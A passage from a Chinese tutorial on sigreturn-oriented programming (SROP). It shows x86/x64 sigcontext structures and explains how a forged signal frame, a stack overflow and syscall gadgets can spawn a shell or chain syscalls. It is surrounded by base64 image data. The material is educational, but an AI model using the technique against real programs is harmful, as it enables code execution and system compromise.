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)\n\n对于signal Frame来说，不同会因为架构的不同而因此有所区别，这里给出分别给出x86以及x64的sigcontext\n\nx86\n\n```c\nstruct sigcontext\n{\n  unsigned short gs, __gsh;\n  unsigned short fs, __fsh;\n  unsigned short es, __esh;\n  unsigned short ds, __dsh;\n  unsigned long edi;\n  unsigned long esi;\n  unsigned long ebp;\n  unsigned long esp;\n  unsigned long ebx;\n  unsigned long edx;\n  unsigned long ecx;\n  unsigned long eax;\n  unsigned long trapno;\n  unsigned long err;\n  unsigned long eip;\n  unsigned short cs, __csh;\n  unsigned long eflags;\n  unsigned long esp_at_signal;\n  unsigned short ss, __ssh;\n  struct _fpstate * fpstate;\n  unsigned long oldmask;\n  unsigned long cr2;\n};\n```\n\nx64\n\n```c\nstruct _fpstate\n{\n  /* FPU environment matching the 64-bit FXSAVE layout.  */\n  __uint16_t        cwd;\n  __uint16_t        swd;\n  __uint16_t        ftw;\n  __uint16_t        fop;\n  __uint64_t        rip;\n  __uint64_t        rdp;\n  __uint32_t        mxcsr;\n  __uint32_t        mxcr_mask;\n  struct _fpxreg    _st[8];\n  struct _xmmreg    _xmm[16];\n  __uint32_t        padding[24];\n};\n\nstruct sigcontext\n{\n  __uint64_t r8;\n  __uint64_t r9;\n  __uint64_t r10;\n  __uint64_t r11;\n  __uint64_t r12;\n  __uint64_t r13;\n  __uint64_t r14;\n  __uint64_t r15;\n  __uint64_t rdi;\n  __uint64_t rsi;\n  __uint64_t rbp;\n  __uint64_t rbx;\n  __uint64_t rdx;\n  __uint64_t rax;\n  __uint64_t rcx;\n  __uint64_t rsp;\n  __uint64_t rip;\n  __uint64_t eflags;\n  unsigned short cs;\n  unsigned short gs;\n  unsigned short fs;\n  unsigned short __pad0;\n  __uint64_t err;\n  __uint64_t trapno;\n  __uint64_t oldmask;\n  __uint64_t cr2;\n  __extension__ union\n    {\n      struct _fpstate * fpstate;\n      __uint64_t __fpstate_word;\n    };\n  __uint64_t __reserved1 [8];\n};\n```\n\nsignal     handler返回后，内核为执行sigreturn系统调用，为该进程恢复之前保存的上下文，其中包括将所有压入的寄存器，重新pop回对应的寄存器，最后恢复进程的执行。其中，32位的sigreturn的调用号为77，64位的系统调用号为15。\n\n**攻击原理**\n\n仔细回顾一下内核在signal信号处理的过程中的工作，我们可以发现，内核主要做的工作就是为进程保存上下文，并且恢复上下文。这个主要的变动都在Signal Frame中。但是需要注意的是：\n\n- Signal  Frame被保存在用户的地址空间中，所以用户是可以读写的。\n- 由于内核与信号处理程序无关(kernel     agnostic about signal handlers)，它并不会去记录这个signal对应的Signal     Frame，所以当执行sigreturn系统调用时，此时的Signal Frame并不一定是之前内核为用户进程保存的Signal Frame。\n\n说到这里，其实，SROP的基本利用原理也就出现了。下面举两个简单的例子。\n\n**获取shell**\n\n首先，我们假设攻击者可以控制用户进程的栈，那么它就可以伪造一个Signal Frame，如下图所示，这里以64位为例子，给出Signal Frame更加详细的信息\n\n当系统执行完sigreturn系统调用之后，会执行一系列的pop指令以便于恢复相应寄存器的值，当执行到rip时，就会将程序执行流指向syscall地址，根据相应寄存器的值，此时，便会得到一个shell。\n\n**system call chains**\n\n需要指出的是，上面的例子中，我们只是单独的获得一个shell。有时候，我们可能会希望执行一系列的函数。我们只需要做两处修改即可\n\n- **控制栈指针。**\n- **把原来rip指向的syscall     gadget换成syscall; ret gadget。**\n\n如下图所示 ，这样当每次syscall返回的时候，栈指针都会指向下一个Signal Frame。因此就可以执行一系列的sigreturn函数调用。\n\n**后续**\n\n需要注意的是，我们在构造ROP攻击的时候，需要满足下面的条件\n\n- **可以通过栈溢出来控制栈的内容**\n\n- **需要知道相应的地址**\n\n- - **\"/bin/sh\"**\n  - **Signal      Frame**\n  - **syscal**\n  - **sigreturn**\n\n- 需要有够大的空间来塞下整个sigal     frame\n\n此外，关于sigreturn以及syscall;ret这两个gadget在上面并没有提及。提出该攻击的论文作者发现了这些gadgets出现的某些地址：\n\n\n\n并且，作者发现，有些系统上SROP的地址被随机化了，而有些则没有。比如说Linux < 3.3 x86_64（在Debian 7.0， Ubuntu Long Term Support， CentOS 6系统中默认内核），可以直接在vsyscall中的固定地址处找到syscall&return代码片段。如下\n\n![gadget1](data:image/png;base64,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WpeKwhrpFxERERHZA28pS9fJZfz5yj2Y8BMHFEREREQ3Ow4qyMbycObfLzFtQDsMmrsPmbxTKhEREdFNj6c/UTWo4OQVgID6jnC49pAICvOu4ELqWaRbM88FEREREd1wOKggIiIiIiKr8PQnIiIiIiKyCgcVRERERERkFQ4qiIiIiIjIKhxUEBERERGRVTioICIiIiIiq3BQQUREREREVuGggoiIiIiIrMJBBRERERERWYWDCiIiIiIisgoHFUREREREZBUOKoiIiIiIyCocVBARERERkVU4qCAiIiIiIqtwUEFERERERFbhoIKIiIiIiKzCQQUREREREVmFgwoiIiIiIrIKBxVERERERGQVDiqIiIiIiMgqHFQQEREREZFVOKggIiIiIiKrcFBBRERERERW4aCCiIiIiIiswkEFERERERFZhYMKIiIiIiKyCgcVRERERERkFQ4qiIiIiIjIKhxUEBERERGRVTioICIiIiIiq3BQQUREREREVuGggoiIiIiIrMJBBRERERERWYWDCiIiIiIisgoHFUREREREZBUOKoiIiIiIyCocVBARERERkVU4qCAiIiIiIqtwUEFERERERFbhoIKIiIiIiKzCQQUREREREVmFgwoiIiIiIrKKxt4dICIi2+gIQGfvTtzijgM4b+9OEBHZAQcVREQ3gT8A3G7vThAKADwAYIO9O0JEVMN4+hMR0Q2uDTigqC00AB6zdyeIiOyAgwoiohuck707QOU427sDRER2wNOfiIhuMn0BnLR3J24xiwHcY+9OEBHZEQcVREQ3mbPFQTWH65uIbnU8/YmIiIiIiKzCQQUREREREVmFgwoiIiIiIrIKBxVERERERGQVDiqIiIiIiMgqHFQQEREREZFVOKggIiIiIiKrcFBBRERERERW4eR3RERERFTj1O4t0LmtNzRXk3HwwClkFdm7R2SNWjCoUEHXvB9GDQ9DSy8dtKocHP58LlYfySmfpWuOfqOGI6ylF3RaFXIOf46Zq48wx4IcjXsgOgY3g1vBeRw7cBjJ2RU+vSpn+HUIRWuPPCRGRyI+owBGaluOzamh0aqhQhEK9AUov4ac4N0uFO0bOyLrRDT2x1+C7XukgkarMX0IsagQBQWFsP13rgrOfh0Q2toDeYnRiIzPqP5yadwR2DEYzdwKcP7YARxOzq7QX1vVUtJOTdYCVM5+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